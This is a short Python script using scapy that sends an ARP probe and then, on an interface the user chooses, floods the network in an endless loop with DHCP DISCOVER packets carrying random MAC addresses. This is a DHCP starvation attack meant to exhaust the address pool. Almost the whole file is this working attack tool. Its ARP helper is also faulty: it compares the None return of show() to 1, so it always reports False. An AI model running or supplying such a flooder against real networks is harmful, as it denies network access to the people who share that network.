from telnetlib import IP
import netifaces
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import UDP
from scapy.layers.l2 import Ether
import netifaces
import time
import scapy.all as scapy

import scapy.all as scapy

def send_packet(ip):
    arp_request = scapy.ARP(pdst=ip)
    arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = arp_broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(combined_packet, timeout=1)
    if answered_list.show() == 1:
        return True
    else:
        return False
print("test")
print(send_packet("192.168.1.1"))

def action(name):
    conf.checkIPaddr = False

    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC()) \
                            / IP(src="0.0.0.0", dst="255.255.255.255") \
                            / UDP(sport=68,dport=67) \
                            / BOOTP(op=1,chaddr=RandMAC()) \
                            / DHCP(options=[('message-type','discover'),('end')])
    while True:
        for i in range(100):
            send(dhcp_discover, iface=name,verbose=1)
        time.sleep(240)
def liorniv():
    i = 0
    name = []
    netifaces.gateways()
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        print(interface, "number of intrerface",i)
        interface = str(interface)
        name.insert(i, interface)
        i += 1
    print(i)
    Choice = input("please enter number of interface")
    Choice = int(Choice)
    if (Choice >= 0 and Choice < i):
        print(name[Choice], netifaces.ifaddresses(str(interfaces[Choice])))
        action(name[Choice])
    else:
        print("worng enter again")
        liorniv()
liorniv()
